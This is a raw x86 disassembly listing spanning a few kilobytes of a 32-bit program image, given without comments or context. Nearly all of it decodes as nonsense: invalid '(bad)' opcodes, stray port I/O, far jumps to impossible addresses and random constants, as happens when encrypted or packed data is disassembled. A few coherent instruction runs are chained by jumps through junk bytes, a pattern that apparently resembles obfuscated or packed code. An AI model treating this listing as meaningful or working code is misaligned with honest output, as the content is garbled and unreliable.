  40b55e:	(bad)  
  40b55f:	lds    ebx,FWORD PTR [ecx+0x1a]
  40b562:	jecxz  0x40b588
  40b564:	push   edi
  40b565:	retf   0x8067
  40b568:	or     eax,0xb0faf4bb
  40b56d:	push   esp
  40b56e:	dec    esp
  40b56f:	cs aad 0x22
  40b572:	(bad)  
  40b573:	pop    edx
  40b574:	adc    BYTE PTR [ebp+0x4a861a68],bh
  40b57a:	xor    eax,0xec017fb6
  40b57f:	out    0x6c,al
  40b581:	mov    edi,0x8000a33b
  40b586:	sbb    eax,0x305c112
  40b58b:	push   ebx
  40b58c:	leave  
  40b58d:	out    dx,eax
  40b58e:	push   esp
  40b58f:	mov    ah,0xc3
  40b591:	dec    eax
  40b592:	add    DWORD PTR [ebx],eax
  40b594:	cmp    esi,edi
  40b596:	inc    ecx
  40b597:	push   ecx
  40b598:	xchg   esi,eax
  40b599:	in     eax,0xac
  40b59b:	mov    edi,0x89baf3c8
  40b5a0:	fild   QWORD PTR [ebp+0x48771f77]
  40b5a6:	mov    BYTE PTR [esi+ebx*4-0x35],dl
  40b5aa:	out    0x7c,al
  40b5ac:	out    dx,eax
  40b5ad:	jns    0x40b5e0
  40b5af:	sbb    DWORD PTR [edi+0x39],edi
  40b5b2:	out    0xe,eax
  40b5b4:	(bad)  
  40b5b5:	(bad)  
  40b5b6:	jae    0x40b573
  40b5b8:	cmp    dh,0x3b
  40b5bb:	fcmovne st,st(2)
  40b5bd:	and    esp,esp
  40b5bf:	mov    al,0xc6
  40b5c1:	(bad)
  40b5c5:	hlt    
  40b5c6:	cmp    ah,BYTE PTR [eax]
  40b5c8:	adc    bh,BYTE PTR [edx+0x2a74670a]
  40b5ce:	jg     0x40b586
  40b5d0:	mov    al,0xb1
  40b5d2:	pusha  
  40b5d3:	loope  0x40b635
  40b5d5:	test   eax,0x300c8e15
  40b5da:	fbld   TBYTE PTR [edi+0x3d]
  40b5dd:	cld    
  40b5de:	sbb    DWORD PTR [edi-0x2d592313],esi
  40b5e4:	sub    DWORD PTR ds:0x253e5d77,0xffffffe7
  40b5eb:	les    esp,FWORD PTR [eax]
  40b5ed:	pop    esi
  40b5ee:	adc    eax,0x8be5c616
  40b5f3:	repz data16 cmp BYTE PTR [bp+0x3b],bh
  40b5f9:	cs int3 
  40b5fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5fc:	fwait
  40b5fd:	mov    ch,0x82
  40b5ff:	in     eax,dx
  40b600:	add    DWORD PTR [ebx+0x37],ecx
  40b603:	aaa    
  40b604:	mov    ebx,0x633ef07b
  40b609:	outs   dx,BYTE PTR ds:[esi]
  40b60a:	push   edi
  40b60b:	xlat   BYTE PTR ds:[ebx]
  40b60c:	ds add DWORD PTR es:[ebx],eax
  40b610:	dec    esp
  40b611:	dec    ecx
  40b612:	pusha  
  40b613:	mov    esi,0xff6625ce
  40b618:	mov    DWORD PTR [edx+edx*8+0x41],ebp
  40b61c:	and    DWORD PTR [ebp+0x67],ebx
  40b61f:	cwde   
  40b620:	ret    
  40b621:	xor    bh,ch
  40b623:	and    DWORD PTR [edi+0x45],ebp
  40b626:	mov    ah,BYTE PTR [edx-0x5b]
  40b629:	mov    edi,0x54883ba9
  40b62e:	(bad)  
  40b630:	xchg   ebx,eax
  40b631:	jecxz  0x40b5e8
  40b633:	add    dl,BYTE PTR [ecx]
  40b635:	cmc    
  40b636:	push   es
  40b637:	in     eax,0xf3
  40b639:	icebp  
  40b63a:	mov    ecx,0x57529dcb
  40b63f:	out    0xdd,al
  40b641:	cld    
  40b642:	ret    0x5a19
  40b645:	pop    es
  40b646:	pusha  
  40b647:	fidivr DWORD PTR [esi]
  40b649:	mov    ecx,0x3036d4c1
  40b64e:	addr16 stc 
  40b650:	mov    WORD PTR [eax],ds
  40b652:	sbb    al,0xe1
  40b654:	pop    ss
  40b655:	dec    edi
  40b656:	inc    esp
  40b657:	das    
  40b658:	sub    esp,edi
  40b65a:	stos   BYTE PTR es:[edi],al
  40b65b:	pusha  
  40b65c:	std    
  40b65d:	les    esi,FWORD PTR [ebp+0x3d]
  40b660:	sti    
  40b661:	es (bad) 
  40b663:	adc    BYTE PTR ds:0x3fe8401e,0xd4
  40b66a:	mov    WORD PTR [eax-0x3805ae7],fs
  40b670:	mov    eax,ds:0xd5785665
  40b675:	add    esi,DWORD PTR [eax+0x33]
  40b678:	push   0xffffffc1
  40b67a:	or     cl,bl
  40b67c:	push   DWORD PTR [ecx]
  40b67e:	ret    
  40b67f:	jns    0x40b62e
  40b681:	push   ebx
  40b682:	and    BYTE PTR [ebp+ecx*2-0x31],al
  40b686:	inc    ecx
  40b687:	rcr    BYTE PTR [edx],cl
  40b689:	outs   dx,BYTE PTR ds:[esi]
  40b68a:	dec    ecx
  40b68b:	adc    DWORD PTR [edx],esp
  40b68d:	fistp  WORD PTR [esi+0x7eaded4d]
  40b693:	xchg   esp,eax
  40b694:	jmp    0xdb6206a0
  40b699:	xor    ebp,esp
  40b69b:	dec    edx
  40b69c:	lar    esi,cx
  40b69f:	(bad)
  40b6a2:	jns    0x40b67a
  40b6a4:	push   ebp
  40b6a5:	in     eax,0x3
  40b6a7:	cmp    ecx,eax
  40b6a9:	es mov bh,0xad
  40b6ac:	nop
  40b6ad:	and    cl,BYTE PTR [ecx-0xfba7426]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x83
  40b6da:	(bad)  
  40b6db:	imul   edx,DWORD PTR [ecx-0x27],0x2e7e7ef2
  40b6e2:	jge    0x40b762
  40b6e4:	jle    0x40b6fb
  40b6e6:	sub    DWORD PTR ds:0xfeeff52f,0x5c02788a
  40b6f0:	xchg   BYTE PTR [edi+0xb],al
  40b6f3:	push   edx
  40b6f4:	mov    ds,WORD PTR [ecx-0x675def3d]
  40b6fa:	les    ebp,FWORD PTR [ecx-0x31]
  40b6fd:	gs inc esi
  40b6ff:	cmc    
  40b700:	test   eax,0x7694d328
  40b705:	imul   ebx,DWORD PTR ds:0x2378e80c,0x0
  40b70c:	jmp    0xf86ae6e6
  40b711:	aam    0xcb
  40b713:	add    ebx,edx
  40b715:	ds pop edi
  40b717:	adc    cl,BYTE PTR [ecx-0xa]
  40b71a:	mov    dh,0x21
  40b71c:	addr16 mov ecx,0xb478a0a9
  40b722:	lods   eax,DWORD PTR ds:[si]
  40b724:	push   esi
  40b725:	xchg   DWORD PTR [ecx+ebx*4],ecx
  40b728:	imul   esi,DWORD PTR [esi-0x3a19b999],0x5056b9d9
  40b732:	jecxz  0x40b6d5
  40b734:	ins    DWORD PTR es:[edi],dx
  40b735:	xor    cl,al
  40b737:	inc    esi
  40b738:	mov    ch,0xdf
  40b73a:	ins    BYTE PTR es:[edi],dx
  40b73b:	cmc    
  40b73c:	push   0x160556a5
  40b741:	xor    ecx,DWORD PTR [esi+0x2e5b2f41]
  40b747:	(bad)  
  40b748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b749:	sahf   
  40b74a:	and    BYTE PTR [eax],dl
  40b74c:	mov    fs,ecx
  40b74e:	fidiv  DWORD PTR [ecx-0x5f9bf710]
  40b754:	jp     0x40b706
  40b756:	jmp    0x6e2ab200
  40b75b:	fdiv   QWORD PTR [edx+0x193bc373]
  40b761:	fisub  WORD PTR [edi]
  40b763:	sub    BYTE PTR [esi+0x4123ecf7],0xa1
  40b76a:	pop    edi
  40b76b:	cmp    ah,BYTE PTR [eax-0x11]
  40b76e:	mov    dl,0xca
  40b770:	mov    bl,0x2d
  40b772:	sub    DWORD PTR [eax+eax*8],0x4153601c
  40b779:	push   edi
  40b77a:	or     ebx,DWORD PTR [esi-0x75]
  40b77d:	sar    ebp,1
  40b77f:	xchg   edx,eax
  40b780:	jg     0x40b73b
  40b782:	push   0xd80318e0
  40b787:	or     eax,0xceff84ee
  40b78c:	ret    0xa60f
  40b78f:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b791:	shl    BYTE PTR ds:[edi+0x54a16960],cl
  40b798:	out    0x6c,al
  40b79a:	xlat   BYTE PTR ds:[ebx]
  40b79b:	(bad)
  40b79e:	xchg   ebp,eax
  40b79f:	adc    eax,0x3a507f30
  40b7a4:	lahf   
  40b7a5:	popf   
  40b7a6:	pushf  
  40b7a7:	mov    cl,0x17
  40b7a9:	or     eax,0x45b655c
  40b7ae:	jmp    0xf7f9:0xf37ad4ee
  40b7b5:	retf   0xc6cd
  40b7b8:	(bad)  
  40b7b9:	(bad)  [ebx+0x21]
  40b7bc:	sbb    cl,BYTE PTR [eax+ebp*4-0x603f7383]
  40b7c3:	lahf   
  40b7c4:	repnz adc eax,eax
  40b7c7:	xchg   ebp,ebx
  40b7c9:	sbb    DWORD PTR [edx-0x51],ecx
  40b7cc:	jg     0x40b80e
  40b7ce:	sbb    al,0xbc
  40b7d0:	adc    BYTE PTR [ebx-0x431e4b64],0x21
  40b7d7:	imul   esp,ebp,0xffffffeb
  40b7da:	call   0x99d94ad5
  40b7df:	mov    ebp,0x3d1f2b54
  40b7e4:	dec    edx
  40b7e5:	imul   DWORD PTR [eax]
  40b7e7:	or     al,0x9b
  40b7e9:	(bad)  
  40b7ea:	fsub   QWORD PTR [ecx]
  40b7ec:	popa   
  40b7ed:	xor    BYTE PTR [esi+0x7e],bh
  40b7f0:	pop    ebp
  40b7f1:	cmp    eax,0xd9c6e3d0
  40b7f6:	scas   eax,DWORD PTR es:[edi]
  40b7f7:	xchg   edx,eax
  40b7f8:	dec    edi
  40b7f9:	add    al,BYTE PTR [edx]
  40b7fb:	mov    bl,0x89
  40b7fd:	pushf  
  40b7fe:	adc    DWORD PTR [esi-0x7c],ebp
  40b801:	push   edx
  40b802:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b803:	add    esp,DWORD PTR [ecx+0x64]
  40b806:	test   al,0x2d
  40b808:	loope  0x40b809
  40b80a:	sahf   
  40b80b:	(bad)  
  40b80c:	fild   DWORD PTR [ecx+eiz*2-0x3f]
  40b810:	mov    dl,0x6e
  40b812:	mov    dh,0x1
  40b814:	mov    esi,0x90f16715
  40b819:	lds    ecx,FWORD PTR [edi+0x8185aaf]
  40b81f:	or     DWORD PTR [ecx+0x1887444f],esp
  40b825:	retf   
  40b826:	cmp    bh,BYTE PTR [ecx+ecx*1]
  40b829:	retf   
  40b82a:	xor    DWORD PTR [ecx],ecx
  40b82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b82d:	jns    0x40b827
  40b82f:	cmp    DWORD PTR [eax+ebx*4-0x73035d51],esp
  40b836:	int    0x22
  40b838:	(bad)  
  40b839:	popa   
  40b83a:	xor    al,0x90
  40b83c:	push   ds
  40b83d:	jbe    0x40b8b2
  40b83f:	xchg   edi,eax
  40b840:	out    0xcf,eax
  40b842:	fldenv [edx-0x7bbc08a]
  40b848:	adc    eax,0xd9c87f64
  40b84d:	mov    BYTE PTR ds:0xa70e4bec,ch
  40b853:	jne    0x40b80d
  40b855:	sbb    dl,BYTE PTR [ecx+edi*2]
  40b858:	adc    DWORD PTR [ebx-0x667cb606],edi
  40b85e:	dec    edi
  40b85f:	cmp    edx,DWORD PTR [ecx]
  40b861:	mov    bh,0x42
  40b863:	xor    dh,ah
  40b865:	mov    DWORD PTR [ecx-0x55183609],0xd2e8defe
  40b86f:	arpl   cx,di
  40b871:	inc    esi
  40b872:	or     BYTE PTR [edx+0xa],al
  40b875:	push   ebx
  40b876:	fidiv  WORD PTR [ebx+esi*8-0x7f]
  40b87a:	mulps  xmm6,XMMWORD PTR [edx-0x51]
  40b87e:	fwait
  40b87f:	int3   
  40b880:	hlt    
  40b881:	(bad)  
  40b882:	cmp    DWORD PTR [ebp+0x66],eax
  40b885:	xlat   BYTE PTR ds:[ebx]
  40b886:	inc    eax
  40b887:	push   esp
  40b888:	xlat   BYTE PTR ds:[ebx]
  40b889:	push   cs
  40b88a:	pop    edx
  40b88b:	ret    
  40b88c:	ja     0x40b8fe
  40b88e:	xlat   BYTE PTR ds:[ebx]
  40b88f:	inc    ebp
  40b890:	mov    eax,ds:0xbd78cbb
  40b895:	pop    edx
  40b896:	pop    ebx
  40b897:	rol    edx,1
  40b899:	sar    BYTE PTR [eax+eax*2+0x42],cl
  40b89d:	adc    DWORD PTR [edx+0x529fd7d8],edi
  40b8a3:	adc    DWORD PTR [ecx],edi
  40b8a5:	ret    
  40b8a6:	inc    eax
  40b8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8a8:	popf   
  40b8a9:	push   DWORD PTR [ebx]
  40b8ab:	xchg   BYTE PTR [ecx+0x98e7c76],ch
  40b8b1:	popa   
  40b8b2:	sub    BYTE PTR [ecx+0x51],bh
  40b8b5:	sbb    BYTE PTR [eax-0x3cd89a9a],dl
  40b8bb:	mov    ds,WORD PTR [edi+0x53]
  40b8be:	add    DWORD PTR [ebx],0xec8c1935
  40b8c4:	pop    ebx
  40b8c5:	pop    eax
  40b8c6:	lods   eax,DWORD PTR ds:[esi]
  40b8c7:	mov    ds:0x3f0ca590,al
  40b8cc:	repz mov al,BYTE PTR [ebx-0x104fd114]
  40b8d3:	dec    eax
  40b8d4:	pop    edi
  40b8d5:	inc    esi
  40b8d6:	add    BYTE PTR [esi],0xa5
  40b8d9:	inc    eax
  40b8da:	sub    BYTE PTR [esi+0x20],dh
  40b8dd:	inc    edi
  40b8de:	pop    ebp
  40b8df:	and    cl,BYTE PTR [eax-0x70]
  40b8e2:	sbb    al,0x81
  40b8e4:	popa   
  40b8e5:	dec    ebp
  40b8e6:	pop    es
  40b8e7:	repz cmp ah,al
  40b8ea:	retf   
  40b8eb:	xchg   edi,eax
  40b8ec:	sbb    eax,0xe0ad66ea
  40b8f1:	cmc    
  40b8f2:	int3   
  40b8f3:	test   al,0xf1
  40b8f5:	test   eax,0xb8852c4d
  40b8fa:	dec    edx
  40b8fb:	into   
  40b8fc:	ins    BYTE PTR es:[edi],dx
  40b8fd:	and    al,0xf1
  40b8ff:	mov    ebx,0x9ebbd20c
  40b904:	sub    BYTE PTR [esi],dh
  40b906:	add    BYTE PTR [esi+eiz*2-0x6af2ef90],dh
  40b90d:	dec    esi
  40b90e:	(bad)  
  40b90f:	dec    esp
  40b910:	fst    QWORD PTR [eax-0x13]
  40b913:	pop    edx
  40b914:	inc    esp
  40b915:	xor    edi,ebp
  40b917:	in     al,dx
  40b918:	mov    ah,0x74
  40b91a:	sub    BYTE PTR [eax-0x1],0xe
  40b91e:	fst    QWORD PTR [edx+0x5d986d95]
  40b924:	cmp    al,0x29
  40b926:	sti    
  40b927:	push   edi
  40b928:	fcomp  DWORD PTR [eax+0x60099dd0]
  40b92e:	mov    ah,0x2b
  40b930:	adc    DWORD PTR [edx],eax
  40b932:	dec    esp
  40b933:	and    al,0xc8
  40b935:	mov    ah,0xde
  40b937:	mov    al,ds:0x6903da40
  40b93c:	adc    esi,DWORD PTR [esi]
  40b93e:	in     al,0x6c
  40b940:	(bad)  
  40b941:	adc    eax,0x6b10e051
  40b946:	stc    
  40b947:	stos   DWORD PTR es:[edi],eax
  40b948:	jmp    0x22db8c86
  40b94d:	arpl   WORD PTR [edi+0x51244465],dx
  40b953:	fcmovnu st,st(5)
  40b955:	xor    BYTE PTR [ebx+0x27e055d0],bh
  40b95b:	jae    0x40b996
  40b95d:	int3   
  40b95e:	push   ecx
  40b95f:	sub    al,0x6
  40b961:	shr    BYTE PTR [edx-0x3],0xf5
  40b965:	daa    
  40b966:	pushf  
  40b967:	and    DWORD PTR [ebp-0x18],0xffffff87
  40b96b:	iret   
  40b96c:	ds pop ecx
  40b96e:	xchg   ebx,eax
  40b96f:	and    bl,ah
  40b971:	int    0x7d
  40b973:	shr    BYTE PTR [ebx+0x18],0xbb
  40b977:	stos   BYTE PTR es:[edi],al
  40b978:	sub    DWORD PTR [eax+edx*2],edi
  40b97b:	jge    0x40b9e0
  40b97d:	(bad)  
  40b97e:	gs hlt 
  40b980:	mov    edi,esp
  40b982:	jo     0x40b9af
  40b984:	rol    ah,0x1e
  40b987:	fwait
  40b988:	push   esi
  40b989:	push   0xa966dc51
  40b98e:	cwde   
  40b98f:	gs inc ecx
  40b991:	out    dx,eax
  40b992:	fcmovne st,st(6)
  40b994:	mov    al,ds:0x1addca69
  40b999:	adc    eax,0xb2b9bfcb
  40b99e:	imul   esp,ebx,0x1e
  40b9a1:	lahf   
  40b9a2:	sti    
  40b9a3:	stos   DWORD PTR es:[edi],eax
  40b9a4:	jp     0x40b95c
  40b9a6:	sbb    DWORD PTR [ebp-0x75],eax
  40b9a9:	das    
  40b9aa:	xor    al,al
  40b9ac:	push   0x6e5632a0
  40b9b1:	loope  0x40ba29
  40b9b3:	repnz inc edi
  40b9b5:	int    0xac
  40b9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b8:	jle    0x40b959
  40b9ba:	jl     0x40b9c8
  40b9bc:	aas    
  40b9bd:	aad    0x62
  40b9bf:	aas    
  40b9c0:	xchg   edx,eax
  40b9c1:	rol    BYTE PTR [ebp-0x50d878e0],cl
  40b9c7:	jo     0x40b99e
  40b9c9:	jmp    0x40ba3c
  40b9cb:	pop    edx
  40b9cc:	test   BYTE PTR [ebp+0x3ccbb4ae],0xc6
  40b9d3:	xlat   BYTE PTR ds:[ebx]
  40b9d4:	(bad)  
  40b9d5:	out    dx,al
  40b9d6:	popa   
  40b9d7:	loopne 0x40b9b3
  40b9d9:	and    ah,ah
  40b9db:	add    DWORD PTR [eax+esi*4+0x6e],edi
  40b9df:	jnp    0x40ba60
  40b9e1:	add    eax,0xd67e4c89
  40b9e6:	aas    
  40b9e7:	dec    ebp
  40b9e8:	dec    ebx
  40b9e9:	xchg   ebx,eax
  40b9ea:	inc    esp
  40b9eb:	inc    ecx
  40b9ec:	repz sbb eax,0x3afd40be
  40b9f2:	gs sub eax,0x67fb903f
  40b9f8:	add    bl,cl
  40b9fa:	sahf   
  40b9fb:	out    dx,al
  40b9fc:	test   al,bl
  40b9fe:	js     0x40b9f3
  40ba00:	push   0xcb766871
  40ba05:	inc    esp
  40ba06:	jns    0x40ba23
  40ba08:	(bad)  
  40ba09:	and    DWORD PTR ds:[edx+0x8f68e74],eax
  40ba10:	cmc    
  40ba11:	fisub  DWORD PTR [ebx]
  40ba13:	icebp  
  40ba14:	int    0x66
  40ba16:	mov    ecx,DWORD PTR [ebp-0x4]
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	out    dx,al
  40ba36:	out    0x6c,al
  40ba38:	cs mov ecx,esi
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba46
  40ba42:	in     al,dx
  40ba43:	je     0x40ba97
  40ba45:	push   edx
  40ba46:	fidiv  DWORD PTR [ebx]
  40ba48:	sahf   
  40ba49:	(bad)  
  40ba4a:	jmp    0x40ba2c
  40ba4c:	ds iret 
  40ba4e:	imul   ebx,eax,0xafe04ff3
  40ba54:	cmp    al,0xcc
  40ba56:	sub    eax,0x43ac99cd
  40ba5b:	outs   dx,BYTE PTR ds:[esi]
  40ba5c:	loopne 0x40bab7
  40ba5e:	pop    ss
  40ba5f:	ins    DWORD PTR es:[edi],dx
  40ba60:	adc    ch,BYTE PTR [ebx+0x75b7cec3]
  40ba66:	ret    0x813d
  40ba69:	das    
  40ba6a:	mov    eax,0x9afe2212
  40ba6f:	jno    0x40ba35
  40ba71:	mov    ch,0x10
  40ba73:	push   ecx
  40ba74:	push   ecx
  40ba75:	mov    cl,0x11
  40ba77:	repnz cli 
  40ba79:	pop    edi
  40ba7a:	js     0x40ba3c
  40ba7c:	inc    eax
  40ba7d:	cmp    eax,0x43c2d81f
  40ba82:	push   0xffffffec
  40ba84:	out    dx,al
  40ba85:	ja     0x40ba8f
  40ba87:	push   esi
  40ba88:	sbb    eax,0x66eaf2e2
  40ba8d:	retf   0xad87
  40ba90:	xor    al,0xd8
  40ba92:	fcomp  st(2)
  40ba94:	jns    0x40ba1d
  40ba96:	leave  
  40ba97:	in     eax,dx
  40ba98:	xor    BYTE PTR [edx-0x6b679a09],bl
  40ba9e:	mov    dl,0xb6
  40baa0:	aam    0x1b
  40baa2:	mov    ebp,0xc8393a3e
  40baa7:	adc    al,0x79
  40baa9:	mov    esi,0x8529accb
  40baae:	jmp    0x40ba6c
  40bab0:	mov    dl,dl
  40bab2:	mov    esi,0x9e812f83
  40bab7:	xchg   ebx,eax
  40bab8:	mov    bh,0x6c
  40baba:	je     0x40bace
  40babc:	iret   
  40babd:	add    BYTE PTR [edi+0x7c],ch
  40bac0:	xchg   BYTE PTR [esi-0x2f9017a4],bh
  40bac6:	push   ecx
  40bac7:	mov    esi,0x438a5e2b
  40bacc:	retf   
  40bacd:	test   eax,0x6a926afe
  40bad2:	lods   eax,DWORD PTR ds:[esi]
  40bad3:	in     eax,dx
  40bad4:	sub    BYTE PTR [edx],ch
  40bad6:	gs jge 0x40bac0
  40bad9:	xchg   edx,eax
  40bada:	mov    dl,0x32
  40badc:	inc    ecx
  40badd:	leave  
  40bade:	adc    edi,DWORD PTR [ebx]
  40bae0:	ins    DWORD PTR es:[edi],dx
  40bae1:	xchg   ebx,eax
  40bae2:	cmp    edx,DWORD PTR [ecx]
  40bae4:	pop    es
  40bae5:	adc    DWORD PTR [edx],0x76fd11a
  40baeb:	mov    dh,bl
  40baed:	fbld   TBYTE PTR [edi]
  40baef:	jnp    0x40bb6d
  40baf1:	jp     0x40bae2
  40baf3:	stc    
  40baf4:	stos   DWORD PTR es:[edi],eax
  40baf5:	ja     0x40bab5
  40baf7:	xor    DWORD PTR [eax-0x294fb4aa],esp
  40bafd:	loopne 0x40bb5c
  40baff:	vmread DWORD PTR [edi],eax
  40bb02:	imul   ebx,ecx,0x8ada9e10
  40bb08:	and    al,0xbc
  40bb0a:	inc    ebp
  40bb0b:	call   0xa441:0x2b89f921
  40bb12:	adc    eax,0x5302e4c4
  40bb17:	push   esi
  40bb18:	cmp    BYTE PTR [edi-0x35],0x7a
  40bb1c:	inc    ebx
  40bb1d:	sbb    esi,DWORD PTR [esi-0x569aeef7]
  40bb23:	mov    BYTE PTR ds:[ebp+0x3f],al
  40bb27:	ins    BYTE PTR es:[edi],dx
  40bb28:	out    dx,eax
  40bb29:	aas    
  40bb2a:	sbb    ch,0xbd
  40bb2d:	and    ebp,ebx
  40bb2f:	push   0x79
  40bb31:	lea    ebx,[ebx]
  40bb33:	arpl   WORD PTR [edx+eiz*2],ax
  40bb36:	sbb    edi,edi
  40bb38:	jge    0x40bb92
  40bb3a:	push   ecx
  40bb3b:	(bad)  
  40bb3c:	mov    cl,0xea
  40bb3e:	cmp    eax,0xc4c5420c
  40bb43:	inc    ecx
  40bb44:	mov    DWORD PTR [edx+0x54970ed8],esp
  40bb4a:	pop    ss
  40bb4b:	xor    edx,eax
  40bb4d:	mov    bh,BYTE PTR [ebx+0x75]
  40bb50:	aas    
  40bb51:	out    dx,eax
  40bb52:	push   ebx
  40bb53:	mov    ebx,0xe563741c
  40bb58:	repz mov ?,WORD PTR [ebx+0x16]
  40bb5c:	and    esp,DWORD PTR [bx]
  40bb5f:	iret   
  40bb60:	sub    dh,BYTE PTR [edx+0x67]
  40bb63:	mov    ebx,0x82934636
  40bb68:	xchg   ebp,eax
  40bb69:	loopne 0x40bb29
  40bb6b:	jmp    0x9d21fa5f
  40bb70:	lods   al,BYTE PTR ds:[esi]
  40bb71:	pusha  
  40bb72:	jmp    0x3d64:0x5edbdb59
  40bb79:	fidivr WORD PTR gs:[esi-0x2852719c]
  40bb80:	arpl   WORD PTR [ebx+ecx*4+0x3809828],cx
  40bb87:	inc    BYTE PTR [ebx+0x67]
  40bb8a:	pop    ecx
  40bb8b:	in     eax,0xcd
  40bb8d:	into   
  40bb8e:	jecxz  0x40bb25
  40bb90:	loop   0x40bbeb
  40bb92:	jl     0x40bbe3
  40bb94:	call   0xbc47:0x75564e21
  40bb9b:	and    ebx,0x8f4cf7e8
  40bba1:	sub    DWORD PTR [ecx-0x4d],edx
  40bba4:	jb     0x40bb3c
  40bba6:	jp     0x40bb5c
  40bba8:	jmp    0x5537d9ad
  40bbad:	xor    eax,0x825fbddd
  40bbb2:	aaa    
  40bbb3:	leave  
  40bbb4:	xor    BYTE PTR [ecx+0x2105937c],bh
  40bbba:	push   esp
  40bbbb:	cmp    bl,BYTE PTR [edx]
  40bbbd:	add    edx,0xd329a6dd
  40bbc3:	(bad)  
  40bbc4:	mov    bh,0x63
  40bbc6:	in     eax,dx
  40bbc7:	ja     0x40bb7e
  40bbc9:	mov    bl,BYTE PTR [edi+0x50c2289b]
  40bbcf:	adc    eax,edi
  40bbd1:	adc    DWORD PTR ds:0x64c108b8,edx
  40bbd7:	sahf   
  40bbd8:	pop    eax
  40bbd9:	push   edi
  40bbda:	pop    es
  40bbdb:	add    eax,0x53d31148
  40bbe0:	in     al,0xfc
  40bbe2:	cmc    
  40bbe3:	add    BYTE PTR [edx],ch
  40bbe5:	mov    ebp,DWORD PTR [edi-0x70]
  40bbe8:	or     eax,0x7090cc5e
  40bbed:	movnti DWORD PTR [esi-0x1449b1e9],ebp
  40bbf4:	lods   al,BYTE PTR ds:[esi]
  40bbf5:	fnstenv [ebp+0x5]
  40bbf8:	std    
  40bbf9:	mov    BYTE PTR [edi],dh
  40bbfb:	and    eax,DWORD PTR [esi-0x3e]
  40bbfe:	adc    DWORD PTR [edx+ebx*8-0x39fe420],esp
  40bc05:	pop    ss
  40bc06:	scas   al,BYTE PTR es:[edi]
  40bc07:	inc    ebx
  40bc08:	jae    0x40bc0c
  40bc0a:	sbb    BYTE PTR [esi],cl
  40bc0c:	ins    BYTE PTR es:[edi],dx
  40bc0d:	sub    DWORD PTR [ecx+0x51],eax
  40bc10:	sbb    DWORD PTR [esi-0x60],ebx
  40bc13:	push   0xadca0008
  40bc18:	inc    esp
  40bc19:	ror    DWORD PTR [edx],1
  40bc1b:	sub    eax,0xb2478977
  40bc20:	mov    ah,dl
  40bc22:	enter  0x69d1,0xa8
  40bc26:	pop    ebp
  40bc27:	mov    ds:0x6b193c5e,al
  40bc2c:	std    
  40bc2d:	mov    al,BYTE PTR [ebp+esi*2-0x18315a7b]
  40bc34:	mov    ds:0xd4008516,eax
  40bc39:	pop    edx
  40bc3a:	aaa    
  40bc3b:	or     DWORD PTR [ebp-0x1c23e1ff],esi
  40bc41:	adc    esp,DWORD PTR [ebx+ecx*2+0x5c]
  40bc45:	xchg   ebx,eax
  40bc46:	or     esi,DWORD PTR [edx-0x25ddf5c0]
  40bc4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc4d:	test   al,0xcc
  40bc4f:	cmp    edi,eax
  40bc51:	adc    eax,0x6385dcd6
  40bc56:	jl     0x40bbdb
  40bc58:	test   BYTE PTR [edx+0x2b26ff31],bl
  40bc5e:	mov    edi,0x46019b38
  40bc63:	call   0xe153c5f4
  40bc68:	or     al,0xff
  40bc6a:	push   ecx
  40bc6b:	and    eax,0x7d379b9c
  40bc70:	xor    eax,0x41eefa1d
  40bc75:	mov    eax,0xb353b58b
  40bc7a:	jl     0x40bc48
  40bc7c:	dec    eax
  40bc7d:	out    dx,al
  40bc7e:	leave  
  40bc7f:	repz push esp
  40bc81:	imul   ecx,DWORD PTR [edx+0x20],0xd1cb18d3
  40bc88:	popa   
  40bc89:	xlat   BYTE PTR ds:[ebx]
  40bc8a:	mov    fs,WORD PTR [esi-0xd]
  40bc8d:	mov    dh,BYTE PTR [ebx+0x37]
  40bc90:	push   cs
  40bc91:	add    eax,0x792373b6
  40bc96:	(bad)
  40bc9a:	xchg   edx,eax
  40bc9b:	mov    DWORD PTR [ecx-0x129d69cb],ecx
  40bca1:	jne    0x40bcf8
  40bca3:	lock in eax,dx
  40bca5:	pop    ebx
  40bca6:	jne    0x40bca5
  40bca8:	cmp    BYTE PTR [ecx+0x27],dl
  40bcab:	cmp    cl,BYTE PTR [ebp-0x4ab2554b]
  40bcb1:	gs jmp esp
  40bcb4:	jb     0x40bcb2
  40bcb6:	gs pop ebp
  40bcb8:	aam    0xb4
  40bcba:	ins    BYTE PTR es:[edi],dx
  40bcbb:	mov    cs,WORD PTR [esi-0x5]
  40bcbe:	pop    esi
  40bcbf:	mov    ds:0xb28c0d3b,eax
  40bcc4:	push   ecx
  40bcc5:	bound  ebx,QWORD PTR [edi+0x5711a02]
  40bccb:	pop    edx
  40bccc:	adc    ecx,esp
  40bcce:	inc    ecx
  40bccf:	cdq    
  40bcd0:	mov    al,0xac
  40bcd2:	mov    ecx,0xb257415e
  40bcd7:	push   cs
  40bcd8:	outs   dx,BYTE PTR ds:[esi]
  40bcd9:	js     0x40bc7e
  40bcdb:	out    0x3c,eax
  40bcdd:	pop    ds
